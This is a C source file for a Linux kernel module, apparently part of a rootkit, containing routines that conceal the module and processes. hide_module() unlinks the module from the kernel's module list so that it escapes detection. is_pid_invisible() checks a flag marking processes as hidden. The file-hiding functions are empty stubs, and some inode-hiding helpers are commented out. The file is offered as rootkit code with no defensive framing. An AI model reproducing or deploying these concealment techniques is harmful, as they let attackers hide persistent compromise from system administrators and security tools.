/*
 * Author: Daniel Liscinsky
 */



#include <linux/module.h>
#include <linux/dirent.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#include "kernel_rootkit_actions.h"
#include "kernel_rootkit.h"



static struct list_head *module_previous; // Used to store the previous module when hiding this module from the list of all modules




struct task_struct * find_task(pid_t pid) {
	struct task_struct *p = current;

	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}

	return NULL;
}

int is_pid_invisible(pid_t pid) {
	struct task_struct *task;

	if (!pid)
		return 0;
	
	task = find_task(pid);
	if (!task)
		return 0;
	
	return (task->flags & PF_INVISIBLE) != 0;
}



void unhide_module(void) {
	list_add(&THIS_MODULE->list, module_previous);
	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,	MODULE_NAME);
	is_module_hidden = 0;
}

void hide_module(void) {
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);
	is_module_hidden = 1;
}


/**
 * Is the inode currently hidden?
 * 
 * @return 1 if true, 0 if false.
 */
/*int is_inode_hidden(long inode)
{
	struct inode_list *i_ptr = hidden_inodes_list;
	while(i_ptr)
	{
		if(i_ptr->inode == inode)
			return 1;
		i_ptr = i_ptr->next;
	}
	return 0;
}

/**
 * 
 * 
 * @return 0 on success. On failure, -ENOMEM if no memory available.
 */
/*int make_inode_hidden(long inode)
{
	struct inode_list *new_inode = NULL;

	if (is_inode_hidden(inode))
		return 0;

	new_inode = kmalloc(sizeof(struct inode_list), GFP_KERNEL);
	if(new_inode == NULL)
		return -NOMEM;

	new_inode->next = hidden_inodes_list;
	new_inode->inode = inode;
	hidden_inodes_list = new_inode;

	return 0;
}
*/
/*
void clean_hidden_inodes(void)
{
	struct inode_list *i_ptr = first_inode;
	struct inode_list *tmp;

	while(i_ptr)
	{
		tmp = i_ptr;
		i_ptr = i_ptr->next;
		kfree(tmp);
	}
}
*/

/**
 * 
 * 
 * @return 0 on success.
 */
int unhide_file(const char *filepath) {
	
	// Lookup inode for file
	


	
	// Save inode number from saved file


	return 0;
}

int hide_file(const char *filepath) {


	// Lookup inode for file
	//long inode;

	//...

	// Hide inode
	//if (make_inode_hidden(inode) < 0) {
	//	return -ENOMEM;
	//}


	// Add file path to hidden files list


	// Save file path to disk



	return 0;
}